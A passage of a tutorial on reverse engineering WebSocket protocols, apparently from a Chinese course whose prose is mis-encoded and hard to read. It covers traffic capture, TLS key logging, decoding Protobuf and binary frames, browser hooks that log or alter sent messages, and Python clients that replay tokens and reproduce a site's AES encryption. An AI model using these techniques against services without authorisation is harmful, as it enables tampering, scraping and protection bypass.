<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-27">Hooking æŠ€æœ¯</a></li>
<li><a href="#section-28">API é€†å‘ä¸é‡æ”¾æ”»å‡»</a></li>
<li><a href="#section-23">Node.js è°ƒè¯•æŒ‡å—</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-31">
                                                <h2>[R30] WebSocket Reversing</h2>
                                                <h1>R30: WebSocket é€†å‘åˆ†æ</h1>
<h2>æ¦‚è¿°</h2>
<p>WebSocket (WS) æ˜¯ä¸€ç§å…¨åŒå·¥åè®®ï¼Œå¸¸ç”¨äºå³æ—¶é€šè®¯ã€è‚¡ç¥¨è¡Œæƒ…ã€åœ¨çº¿æ¸¸æˆã€å®æ—¶æ¨é€ç­‰åœºæ™¯ã€‚ä¸ HTTP ä¸åŒï¼ŒWS æ˜¯ä¸€æ¬¡æ¡æ‰‹åå»ºç«‹é•¿è¿æ¥ï¼Œåç»­æ•°æ®éƒ½æ˜¯å¸§ (Frame) çš„å½¢å¼åŒå‘ä¼ è¾“ã€‚</p>
<p>WebSocket é€†å‘çš„æœ¬è´¨æ˜¯<strong>åè®®é€†å‘</strong> â€”â€” ææ¸…æ¥šå®ƒ&quot;è¯´ä»€ä¹ˆè¯&quot;ï¼ˆPayload æ ¼å¼ï¼‰ä»¥åŠ&quot;æ€ä¹ˆè¯´è¯&quot;ï¼ˆçŠ¶æ€æœºã€å¿ƒè·³ã€è®¤è¯ï¼‰ã€‚</p>
<hr />
<h2>1. WebSocket åè®®åŸºç¡€</h2>
<h3>1.1 è¿æ¥å»ºç«‹ï¼ˆUpgrade Handshakeï¼‰</h3>
<p>WebSocket è¿æ¥ç”± HTTP è¯·æ±‚å‡çº§è€Œæ¥ï¼š</p>
<p><strong>å®¢æˆ·ç«¯å‘èµ·å‡çº§è¯·æ±‚</strong>:</p>
<pre><code class="language-http">GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
</code></pre>
<p><strong>æœåŠ¡ç«¯å“åº”</strong>:</p>
<pre><code class="language-http">HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
</code></pre>
<p><strong>é‡ç‚¹å‚æ•°</strong>:</p>
<ul>
<li><code>Sec-WebSocket-Key</code>: å®¢æˆ·ç«¯éšæœºç”Ÿæˆçš„ Base64 ç¼–ç </li>
<li><code>Sec-WebSocket-Accept</code>: æœåŠ¡ç«¯æ ¹æ® Key è®¡ç®—çš„å“ˆå¸Œå€¼</li>
<li><code>Sec-WebSocket-Protocol</code>: å­åè®®ï¼ˆå¦‚ <code>chat</code>, <code>mqtt</code>ï¼‰</li>
</ul>
<h3>1.2 å¸§ç»“æ„ (Frame Structure)</h3>
<p>WebSocket æ•°æ®ä»¥å¸§çš„å½¢å¼ä¼ è¾“ï¼š</p>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
</code></pre>
<p><strong>Opcode (æ“ä½œç )</strong>:</p>
<table>
<thead>
<tr>
  <th>Opcode</th>
  <th>ç±»å‹</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td>0x0</td>
  <td>Continuation</td>
  <td>åˆ†ç‰‡æ¶ˆæ¯çš„åç»­å¸§</td>
</tr>
<tr>
  <td>0x1</td>
  <td>Text</td>
  <td>æ–‡æœ¬æ¶ˆæ¯ï¼ˆUTF-8ï¼‰</td>
</tr>
<tr>
  <td>0x2</td>
  <td>Binary</td>
  <td>äºŒè¿›åˆ¶æ¶ˆæ¯</td>
</tr>
<tr>
  <td>0x8</td>
  <td>Close</td>
  <td>å…³é—­è¿æ¥</td>
</tr>
<tr>
  <td>0x9</td>
  <td>Ping</td>
  <td>å¿ƒè·³è¯·æ±‚</td>
</tr>
<tr>
  <td>0xA</td>
  <td>Pong</td>
  <td>å¿ƒè·³å“åº”</td>
</tr>
</tbody>
</table>
<hr />
<h2>2. æŠ“åŒ…ä¸åˆ†æ</h2>
<h3>2.1 Chrome DevTools</h3>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>æ‰“å¼€ Network é¢æ¿</li>
<li>ç‚¹å‡» &quot;WS&quot; è¿‡æ»¤å™¨ â†’ åªæ˜¾ç¤º WebSocket è¿æ¥</li>
<li>ç‚¹å‡»è¿æ¥åç§° â†’ æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
</ol>
<p><strong>Messages æ ‡ç­¾é¡µ</strong>:</p>
<ul>
<li>ğŸŸ¢ ç»¿è‰²ç®­å¤´ = å®¢æˆ·ç«¯å‘é€ (Send)</li>
<li>ğŸ”´ çº¢è‰²ç®­å¤´ = æœåŠ¡ç«¯æ¥æ”¶ (Receive)</li>
<li>æ—¶é—´æˆ³ã€å¤§å°ã€Opcode</li>
</ul>
<p><strong>Frame åˆ†æ</strong>:</p>
<ul>
<li><strong>Text Frame</strong>: ç›´æ¥æ˜¾ç¤º UTF-8 æ–‡æœ¬ï¼ˆé€šå¸¸æ˜¯ JSONï¼‰</li>
<li><strong>Binary Frame</strong>: æ˜¾ç¤ºä¸ºåå…­è¿›åˆ¶æˆ– Base64<ul>
<li>å¯èƒ½æ˜¯ Protobufã€MsgPackã€è‡ªå®šä¹‰æ ¼å¼</li>
</ul>
</li>
</ul>
<p><strong>æŠ€å·§</strong>: ä¿å­˜æ¶ˆæ¯åˆ°æ–‡ä»¶</p>
<pre><code class="language-javascript">// åœ¨ Console ä¸­æ‰§è¡Œ
const messages = [...document.querySelectorAll(&quot;.message-list-item&quot;)];
const data = messages.map((m) =&gt; m.textContent);
copy(JSON.stringify(data, null, 2)); // å¤åˆ¶åˆ°å‰ªè´´æ¿
</code></pre>
<h3>2.2 Wireshark æŠ“åŒ…</h3>
<p><strong>ä¼˜åŠ¿</strong>: é€‚ç”¨äºéæµè§ˆå™¨åº”ç”¨ï¼ˆæ¡Œé¢å®¢æˆ·ç«¯ã€ç§»åŠ¨ Appï¼‰</p>
<p><strong>è¿‡æ»¤å™¨</strong>:</p>
<pre><code>websocket
websocket.opcode == 1  // åªæ˜¾ç¤ºæ–‡æœ¬å¸§
websocket.opcode == 2  // åªæ˜¾ç¤ºäºŒè¿›åˆ¶å¸§
</code></pre>
<p><strong>SSL/TLS è§£å¯†</strong> (å¯¹äº wss://):</p>
<ol>
<li>è®¾ç½®ç¯å¢ƒå˜é‡:<pre><code class="language-bash">export SSLKEYLOGFILE=~/sslkeys.log
</code></pre>
</li>
<li>å¯åŠ¨åº”ç”¨ï¼ˆæµè§ˆå™¨æˆ–å®¢æˆ·ç«¯ï¼‰</li>
<li>Wireshark é…ç½®:<ul>
<li>Edit â†’ Preferences â†’ Protocols â†’ TLS</li>
<li>(Pre)-Master-Secret log filename: <code>~/sslkeys.log</code></li>
</ul>
</li>
</ol>
<p><strong>æŸ¥çœ‹ Payload</strong>:</p>
<ul>
<li>å³é”®å¸§ â†’ Follow â†’ WebSocket Stream</li>
<li>è‡ªåŠ¨è§£å¯† Masking Key</li>
</ul>
<h3>2.3 mitmproxy</h3>
<p><strong>ä¼˜åŠ¿</strong>: å¯ç¼–ç¨‹æ‹¦æˆªå’Œä¿®æ”¹ WebSocket æ¶ˆæ¯</p>
<p><strong>å¯åŠ¨</strong>:</p>
<pre><code class="language-bash">mitmweb --mode upstream:https://api.example.com --listen-port 8080
</code></pre>
<p><strong>Python è„šæœ¬æ‹¦æˆª</strong>:</p>
<pre><code class="language-python"># ws_intercept.py
from mitmproxy import ctx

def websocket_message(flow):
    # æ‹¦æˆª WebSocket æ¶ˆæ¯
    message = flow.messages[-1]

    if message.from_client:
        ctx.log.info(f&quot;[Client â†’ Server] {message.content}&quot;)
        # ä¿®æ”¹æ¶ˆæ¯
        if b'&quot;type&quot;:&quot;ping&quot;' in message.content:
            message.content = b'{&quot;type&quot;:&quot;pong&quot;}'

    else:
        ctx.log.info(f&quot;[Server â†’ Client] {message.content}&quot;)
</code></pre>
<p><strong>è¿è¡Œ</strong>:</p>
<pre><code class="language-bash">mitmproxy -s ws_intercept.py
</code></pre>
<hr />
<h2>3. åè®®è¿˜åŸ</h2>
<h3>3.1 æ–‡æœ¬åè®® (Text Frame)</h3>
<h4>JSON æ ¼å¼</h4>
<p>æœ€å¸¸è§çš„ WebSocket Payload æ ¼å¼ï¼š</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-json">{
  &quot;type&quot;: &quot;chat&quot;,
  &quot;user_id&quot;: 123,
  &quot;message&quot;: &quot;Hello World&quot;,
  &quot;timestamp&quot;: 1638360000
}
</code></pre>
<p><strong>é€†å‘æ­¥éª¤</strong>:</p>
<ol>
<li>è§‚å¯Ÿå¤šä¸ªæ¶ˆæ¯ï¼Œæå–å­—æ®µè§„å¾‹</li>
<li>æ€»ç»“æ¶ˆæ¯ç±»å‹ï¼ˆ<code>type</code> å­—æ®µï¼‰</li>
<li>ç¼–å†™ Python å®¢æˆ·ç«¯æ—¶ç›´æ¥ <code>json.loads()</code> å’Œ <code>json.dumps()</code></li>
</ol>
<h4>è‡ªå®šä¹‰åˆ†éš”ç¬¦</h4>
<p><strong>ç¤ºä¾‹</strong>: ä½¿ç”¨ <code>|</code> åˆ†éš”</p>
<pre><code>type|chat|user_id|123|message|Hello World
</code></pre>
<p><strong>è§£ææ–¹æ³•</strong>:</p>
<pre><code class="language-python">def parse_message(data):
    parts = data.split('|')
    return {
        parts[i]: parts[i+1]
        for i in range(0, len(parts), 2)
    }

# æµ‹è¯•
msg = &quot;type|chat|user_id|123&quot;
print(parse_message(msg))  # {'type': 'chat', 'user_id': '123'}
</code></pre>
<h3>3.2 äºŒè¿›åˆ¶åè®® (Binary Frame)</h3>
<h4>Protobuf (Protocol Buffers)</h4>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ç´§å‡‘çš„äºŒè¿›åˆ¶æ ¼å¼</li>
<li>å­—æ®µæ²¡æœ‰ Key åç§°ï¼ˆåªæœ‰ Tag ç¼–å·ï¼‰</li>
<li>å¸¸è§äº Google ç³»äº§å“ã€gRPC</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<ol>
<li>æœç´¢ JS ä»£ç ä¸­çš„ <code>proto.decode</code>ã€<code>protobuf.Reader</code></li>
<li>æŸ¥æ‰¾ <code>.proto</code> æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨ JS ä¸­åµŒå…¥æˆ–ä» API è·å–ï¼‰</li>
</ol>
<p><strong>é€†å‘æŠ€å·§ 1: æå– .proto å®šä¹‰</strong></p>
<pre><code class="language-javascript">// åœ¨æµè§ˆå™¨ Console ä¸­æœç´¢
for (let key in window) {
  if (key.includes(&quot;proto&quot;) || key.includes(&quot;Proto&quot;)) {
    console.log(key, window[key]);
  }
}
</code></pre>
<p><strong>é€†å‘æŠ€å·§ 2: ä½¿ç”¨ protobuf-inspector çŒœè§£</strong></p>
<pre><code class="language-bash">pip install protobuf-inspector

# åˆ†æäºŒè¿›åˆ¶æ•°æ®
protobuf-inspector &lt; message.bin
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹</strong>:</p>
<pre><code>1: &quot;chat&quot;           # Tag 1, ç±»å‹ string
2: 123              # Tag 2, ç±»å‹ int
3: 1638360000       # Tag 3, ç±»å‹ int
</code></pre>
<p><strong>Python è§£ç </strong>ï¼ˆå·²çŸ¥ .proto å®šä¹‰ï¼‰:</p>
<pre><code class="language-python">import message_pb2  # ç”± protoc ç¼–è¯‘ç”Ÿæˆ

data = b'\x0a\x04chat\x10\x7b\x18\x80\xe0\xf3\xc6\x06'
msg = message_pb2.ChatMessage()
msg.ParseFromString(data)
print(msg)
</code></pre>
<h4>MsgPack</h4>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ç±»ä¼¼äºŒè¿›åˆ¶ç‰ˆçš„ JSON</li>
<li>æ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼ˆintã€stringã€arrayã€mapï¼‰</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>: æŸ¥æ‰¾ <code>msgpack.decode</code>ã€<code>msgpack.encode</code></p>
<p><strong>Python è§£ç </strong>:</p>
<pre><code class="language-python">import msgpack

data = b'\x82\xa4type\xa4chat\xa7user_id\x7b'
msg = msgpack.unpackb(data)
print(msg)  # {'type': 'chat', 'user_id': 123}
</code></pre>
<p><strong>åœ¨çº¿å·¥å…·</strong>: <a href="https://sugendran.github.io/msgpack-visualizer/">MessagePack Viewer</a></p>
<h4>è‡ªå®šä¹‰äºŒè¿›åˆ¶æ ¼å¼</h4>
<p><strong>æ¡ˆä¾‹</strong>: æŸæ¸¸æˆçš„äºŒè¿›åˆ¶åè®®</p>
<p><strong>æŠ“åŒ…ç¤ºä¾‹</strong>:</p>
<pre><code>00 01 00 7b 00 00 01 8b 48 65 6c 6c 6f
â”‚  â”‚  â”‚     â”‚           â”‚
â”‚  â”‚  â”‚     â”‚           â””â”€ &quot;Hello&quot; (UTF-8)
â”‚  â”‚  â”‚     â””â”€ Timestamp (4 bytes)
â”‚  â”‚  â””â”€ User ID (2 bytes, 0x007b = 123)
â”‚  â””â”€ Message Type (1 = chat)
â””â”€ Version
</code></pre>
<p><strong>é€†å‘æ­¥éª¤</strong>:</p>
<ol>
<li>å¯¹æ¯”å¤šä¸ªæ¶ˆæ¯ï¼Œæ‰¾å‡ºå›ºå®šå­—æ®µä½ç½®</li>
<li>æ ¹æ®æ•°å€¼èŒƒå›´çŒœæµ‹å­—æ®µç±»å‹ï¼ˆuint8, uint16, uint32ï¼‰</li>
<li>ç¼–å†™è§£æå™¨</li>
</ol>
<p><strong>Python è§£æ</strong>:</p>
<pre><code class="language-python">import struct

def parse_custom_protocol(data):
    version, msg_type, user_id, timestamp = struct.unpack('&gt;BBHI', data[:8])
    message = data[8:].decode('utf-8')

    return {
        'version': version,
        'type': msg_type,
        'user_id': user_id,
        'timestamp': timestamp,
        'message': message
    }

# æµ‹è¯•
data = bytes.fromhex('00 01 00 7b 00 00 01 8b 48656c6c6f')
print(parse_custom_protocol(data))
</code></pre>
<hr />
<h2>4. Hook WebSocket</h2>
<h3>4.1 åŠ«æŒ WebSocket æ„é€ å‡½æ•°</h3>
<p>åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥è„šæœ¬ï¼ˆé€šè¿‡ Tampermonkey æˆ–æµè§ˆå™¨æ‰©å±•ï¼‰ï¼š</p>
<pre><code class="language-javascript">(function () {
  const _WebSocket = window.WebSocket;
  window.WebSocket = function (url, protocols) {
    console.log(&quot;[WS] è¿æ¥:&quot;, url);

    const ws = new _WebSocket(url, protocols);

    // Hook send æ–¹æ³•
    const _send = ws.send;
    ws.send = function (data) {
      console.log(&quot;[WS Send]&quot;, data);
      debugger; // å‘é€å‰æ–­ç‚¹
      return _send.apply(this, arguments);
    };

    // Hook message äº‹ä»¶
    ws.addEventListener(&quot;message&quot;, function (e) {
      console.log(&quot;[WS Recv]&quot;, e.data);
    });

    // Hook close äº‹ä»¶
    ws.addEventListener(&quot;close&quot;, function (e) {
      console.log(&quot;[WS Close]&quot;, e.code, e.reason);
    });

    // Hook error äº‹ä»¶
    ws.addEventListener(&quot;error&quot;, function (e) {
      console.error(&quot;[WS Error]&quot;, e);
    });

    return ws;
  };
})();
</code></pre>
<h3>4.2 ä¿®æ”¹æ¶ˆæ¯å†…å®¹</h3>
<pre><code class="language-javascript">const _send = ws.send;
ws.send = function (data) {
  // è§£æ JSON
  let msg = JSON.parse(data);

  // ä¿®æ”¹å†…å®¹
  if (msg.type === &quot;chat&quot;) {
    msg.message = &quot;Modified by hook!&quot;;
  }

  // å‘é€ä¿®æ”¹åçš„æ¶ˆæ¯
  return _send.call(this, JSON.stringify(msg));
};
</code></pre>
<h3>4.3 æ‹¦æˆªäºŒè¿›åˆ¶æ¶ˆæ¯</h3>
<pre><code class="language-javascript">ws.addEventListener(&quot;message&quot;, function (e) {
  if (e.data instanceof ArrayBuffer) {
    // äºŒè¿›åˆ¶æ•°æ®
    const view = new Uint8Array(e.data);
    console.log(
      &quot;[Binary]&quot;,
      Array.from(view)
        .map((b) =&gt; b.toString(16).padStart(2, &quot;0&quot;))
        .join(&quot; &quot;)
    );
  } else {
    // æ–‡æœ¬æ•°æ®
    console.log(&quot;[Text]&quot;, e.data);
  }
});
</code></pre>
<hr />
<h2>5. Python å®¢æˆ·ç«¯å®ç°</h2>
<h3>5.1 åŸºç¡€è¿æ¥</h3>
<pre><code class="language-python">import asyncio
import websockets
import json

async def connect():
    uri = &quot;wss://example.com/socket&quot;

    async with websockets.connect(uri) as ws:
        print(&quot;å·²è¿æ¥&quot;)

        # å‘é€æ¶ˆæ¯
        await ws.send(json.dumps({
            &quot;type&quot;: &quot;auth&quot;,
            &quot;token&quot;: &quot;your_token_here&quot;
        }))

        # æ¥æ”¶æ¶ˆæ¯
        while True:
            message = await ws.recv()
            data = json.loads(message)
            print(&quot;æ”¶åˆ°:&quot;, data)

asyncio.run(connect())
</code></pre>
<h3>5.2 å®Œæ•´å®¢æˆ·ç«¯ç±»</h3>
<pre><code class="language-python">import asyncio
import websockets
import json
import time

class WebSocketClient:
    def __init__(self, uri, token):
        self.uri = uri
        self.token = token
        self.ws = None
        self.running = False

    async def connect(self):
        &quot;&quot;&quot;è¿æ¥ WebSocket&quot;&quot;&quot;
        self.ws = await websockets.connect(
            self.uri,
            extra_headers={
                &quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,
                &quot;Origin&quot;: &quot;https://example.com&quot;
            }
        )
        self.running = True
        print(&quot;[è¿æ¥æˆåŠŸ]&quot;)

        # å‘é€è®¤è¯æ¶ˆæ¯
        await self.send_message({
            &quot;type&quot;: &quot;auth&quot;,
            &quot;token&quot;: self.token
        })

    async def send_message(self, data):
        &quot;&quot;&quot;å‘é€æ¶ˆæ¯&quot;&quot;&quot;
        message = json.dumps(data)
        await self.ws.send(message)
        print(f&quot;[å‘é€] {message}&quot;)

    async def receive_loop(self):
        &quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å¾ªç¯&quot;&quot;&quot;
        try:
            while self.running:
                message = await self.ws.recv()
                await self.handle_message(message)
        except websockets.ConnectionClosed:
            print(&quot;[è¿æ¥å·²å…³é—­]&quot;)
            self.running = False

    async def handle_message(self, message):
        &quot;&quot;&quot;å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯&quot;&quot;&quot;
        try:
            data = json.loads(message)
            print(f&quot;[æ”¶åˆ°] {data}&quot;)

            # æ ¹æ®æ¶ˆæ¯ç±»å‹å¤„ç†
            if data.get(&quot;type&quot;) == &quot;ping&quot;:
                # å“åº”å¿ƒè·³
                await self.send_message({&quot;type&quot;: &quot;pong&quot;})

            elif data.get(&quot;type&quot;) == &quot;data&quot;:
                # å¤„ç†ä¸šåŠ¡æ•°æ®
                self.process_data(data)

        except Exception as e:
            print(f&quot;[é”™è¯¯] å¤„ç†æ¶ˆæ¯å¤±è´¥: {e}&quot;)

    def process_data(self, data):
        &quot;&quot;&quot;å¤„ç†ä¸šåŠ¡æ•°æ®&quot;&quot;&quot;
        # è¿™é‡Œå®ç°ä½ çš„ä¸šåŠ¡é€»è¾‘
        pass

    async def heartbeat_loop(self):
        &quot;&quot;&quot;å¿ƒè·³å¾ªç¯&quot;&quot;&quot;
        while self.running:
            await asyncio.sleep(30)  # æ¯ 30 ç§’
            if self.running:
                await self.send_message({&quot;type&quot;: &quot;ping&quot;})

    async def run(self):
        &quot;&quot;&quot;è¿è¡Œå®¢æˆ·ç«¯&quot;&quot;&quot;
        await self.connect()

        # å¹¶å‘è¿è¡Œæ¥æ”¶å¾ªç¯å’Œå¿ƒè·³å¾ªç¯
        await asyncio.gather(
            self.receive_loop(),
            self.heartbeat_loop()
        )

    async def close(self):
        &quot;&quot;&quot;å…³é—­è¿æ¥&quot;&quot;&quot;
        self.running = False
        if self.ws:
            await self.ws.close()
            print(&quot;[å·²æ–­å¼€è¿æ¥]&quot;)

# ä½¿ç”¨
async def main():
    client = WebSocketClient(
        uri=&quot;wss://example.com/socket&quot;,
        token=&quot;your_token_here&quot;
    )

    try:
        await client.run()
    except KeyboardInterrupt:
        await client.close()

asyncio.run(main())
</code></pre>
<h3>5.3 æ–­çº¿é‡è¿</h3>
<pre><code class="language-python">class WebSocketClient:
    # ... å‰é¢çš„ä»£ç  ...

    async def run_with_reconnect(self):
        &quot;&quot;&quot;å¸¦è‡ªåŠ¨é‡è¿çš„è¿è¡Œ&quot;&quot;&quot;
        max_retries = 5
        retry_count = 0

        while retry_count &lt; max_retries:
            try:
                await self.connect()
                retry_count = 0  # è¿æ¥æˆåŠŸï¼Œé‡ç½®è®¡æ•°

                await asyncio.gather(
                    self.receive_loop(),
                    self.heartbeat_loop()
                )

            except Exception as e:
                retry_count += 1
                wait_time = min(2 ** retry_count, 60)  # æŒ‡æ•°é€€é¿ï¼Œæœ€å¤š 60 ç§’
                print(f&quot;[é”™è¯¯] {e}&quot;)
                print(f&quot;[é‡è¿] {retry_count}/{max_retries}ï¼Œç­‰å¾… {wait_time} ç§’...&quot;)
                await asyncio.sleep(wait_time)

        print(&quot;[å¤±è´¥] è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°&quot;)
</code></pre>
<h3>5.4 å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯</h3>
<pre><code class="language-python">import struct

class WebSocketClient:
    async def handle_message(self, message):
        # åˆ¤æ–­æ¶ˆæ¯ç±»å‹
        if isinstance(message, bytes):
            # äºŒè¿›åˆ¶æ¶ˆæ¯
            await self.handle_binary_message(message)
        else:
            # æ–‡æœ¬æ¶ˆæ¯
            await self.handle_text_message(message)

    async def handle_binary_message(self, data):
        &quot;&quot;&quot;å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯&quot;&quot;&quot;
        # ç¤ºä¾‹ï¼šè‡ªå®šä¹‰åè®®
        msg_type, user_id, timestamp = struct.unpack('&gt;BHI', data[:7])
        payload = data[7:]

        print(f&quot;[äºŒè¿›åˆ¶] type={msg_type}, user_id={user_id}, time={timestamp}&quot;)
        print(f&quot;[Payload] {payload.hex()}&quot;)

    async def handle_text_message(self, message):
        &quot;&quot;&quot;å¤„ç†æ–‡æœ¬æ¶ˆæ¯&quot;&quot;&quot;
        data = json.loads(message)
        print(f&quot;[æ–‡æœ¬] {data}&quot;)
</code></pre>
<hr />
<h2>6. è®¤è¯ä¸å®‰å…¨</h2>
<h3>6.1 Token è®¤è¯</h3>
<p><strong>æ–¹å¼ 1: åœ¨è¿æ¥ URL ä¸­ä¼ é€’</strong></p>
<pre><code class="language-python">uri = f&quot;wss://example.com/socket?token={token}&quot;
</code></pre>
<p><strong>æ–¹å¼ 2: åœ¨ Header ä¸­ä¼ é€’</strong></p>
<pre><code class="language-python">ws = await websockets.connect(
    uri,
    extra_headers={&quot;Authorization&quot;: f&quot;Bearer {token}&quot;}
)
</code></pre>
<p><strong>æ–¹å¼ 3: è¿æ¥åå‘é€è®¤è¯æ¶ˆæ¯</strong></p>
<pre><code class="language-python">await ws.send(json.dumps({&quot;type&quot;: &quot;auth&quot;, &quot;token&quot;: token}))
response = await ws.recv()
# éªŒè¯è®¤è¯æ˜¯å¦æˆåŠŸ
</code></pre>
<h3>6.2 åŠ å¯†æ¶ˆæ¯</h3>
<p><strong>æ¡ˆä¾‹</strong>: æŸèŠå¤©åº”ç”¨çš„ AES åŠ å¯†</p>
<p><strong>æµè§ˆå™¨ç«¯</strong>:</p>
<pre><code class="language-javascript">// å‘é€å‰åŠ å¯†
function sendEncrypted(ws, data) {
  const key = CryptoJS.enc.Utf8.parse(&quot;1234567890abcdef&quot;);
  const iv = CryptoJS.enc.Utf8.parse(&quot;abcdef1234567890&quot;);
  const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
    iv: iv,
    mode: CryptoJS.mode.CBC,
  });
  ws.send(encrypted.toString()); // Base64 æ ¼å¼
}
</code></pre>
<p><strong>Python å¤ç°</strong>:</p>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import json

class EncryptedWebSocketClient(WebSocketClient):
    def __init__(self, uri, token):
        super().__init__(uri, token)
        self.key = b'1234567890abcdef'
        self.iv = b'abcdef1234567890'

    def encrypt_message(self, data):
        &quot;&quot;&quot;åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        plaintext = json.dumps(data).encode()
        encrypted = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(encrypted).decode()

    def decrypt_message(self, encrypted_b64):
        &quot;&quot;&quot;è§£å¯†æ¶ˆæ¯&quot;&quot;&quot;
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        encrypted = base64.b64decode(encrypted_b64)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return json.loads(decrypted.decode())

    async def send_message(self, data):
        &quot;&quot;&quot;å‘é€åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;
        encrypted = self.encrypt_message(data)
        await self.ws.send(encrypted)

    async def handle_message(self, message):
        &quot;&quot;&quot;å¤„ç†åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;
        try:
            decrypted = self.decrypt_message(message)
            print(f&quot;[æ”¶åˆ°] {decrypted}&quot;)
        except Exception as e:
            print(f&quot;[é”™è¯¯] è§£å¯†å¤±è´¥: {e}&quot;)
</code></pre>
<hr />
<h2>7. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1ï¼šè‚¡ç¥¨è¡Œæƒ… WebSocket</h3>
<p><strong>ç›®æ ‡</strong>: è·å–å®æ—¶è‚¡ç¥¨ä»·æ ¼</p>
<p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>
<ol>
<li><p>Chrome DevTools æŠ“åŒ…ï¼Œå‘ç°æ¶ˆæ¯æ ¼å¼ä¸º JSON</p>
</li>
<li><p>è§‚å¯Ÿæ¶ˆæ¯ç±»å‹:</p>
<pre><code class="language-json">// è®¢é˜…è‚¡ç¥¨
{&quot;type&quot;: &quot;subscribe&quot;, &quot;symbols&quot;: [&quot;AAPL&quot;, &quot;TSLA&quot;]}

// æ¥æ”¶è¡Œæƒ…
{&quot;type&quot;: &quot;quote&quot;, &quot;symbol&quot;: &quot;AAPL&quot;, &quot;price&quot;: 150.25, &quot;time&quot;: 1638360000}
</code></pre>
</li>
<li><p>å‘ç°éœ€è¦ç™»å½•åè·å– Token</p>
</li>
</ol>
<p><strong>å®Œæ•´è„šæœ¬</strong>:</p>
<pre><code class="language-python">import asyncio
import websockets
import json

async def stock_client():
    # 1. ç™»å½•è·å– Tokenï¼ˆçœç•¥ç™»å½•ä»£ç ï¼‰
    token = &quot;your_token_here&quot;

    # 2. è¿æ¥ WebSocket
    uri = f&quot;wss://quotes.example.com/stream?token={token}&quot;
    async with websockets.connect(uri) as ws:
        print(&quot;å·²è¿æ¥è‚¡ç¥¨è¡Œæƒ…æœåŠ¡å™¨&quot;)

        # 3. è®¢é˜…è‚¡ç¥¨
        await ws.send(json.dumps({
            &quot;type&quot;: &quot;subscribe&quot;,
            &quot;symbols&quot;: [&quot;AAPL&quot;, &quot;TSLA&quot;, &quot;GOOG&quot;]
        }))

        # 4. æ¥æ”¶è¡Œæƒ…
        while True:
            message = await ws.recv()
            data = json.loads(message)

            if data[&quot;type&quot;] == &quot;quote&quot;:
                symbol = data[&quot;symbol&quot;]
                price = data[&quot;price&quot;]
                print(f&quot;{symbol}: ${price}&quot;)

            elif data[&quot;type&quot;] == &quot;ping&quot;:
                # å“åº”å¿ƒè·³
                await ws.send(json.dumps({&quot;type&quot;: &quot;pong&quot;}))

asyncio.run(stock_client())
</code></pre>
<h3>æ¡ˆä¾‹ 2ï¼šæ¸¸æˆåè®®é€†å‘ï¼ˆProtobufï¼‰</h3>
<p><strong>ç›®æ ‡</strong>: é€†å‘æŸåœ¨çº¿æ¸¸æˆçš„ WebSocket åè®®</p>
<p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>
<ol>
<li>æŠ“åŒ…å‘ç°æ˜¯äºŒè¿›åˆ¶æ¶ˆæ¯ï¼ˆOpcode = 0x2ï¼‰</li>
<li>æœç´¢ JS ä»£ç ï¼Œæ‰¾åˆ° <code>proto</code> å¯¹è±¡å’Œ <code>.proto</code> å®šä¹‰</li>
<li>æå– <code>.proto</code> æ–‡ä»¶å¹¶ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘</li>
</ol>
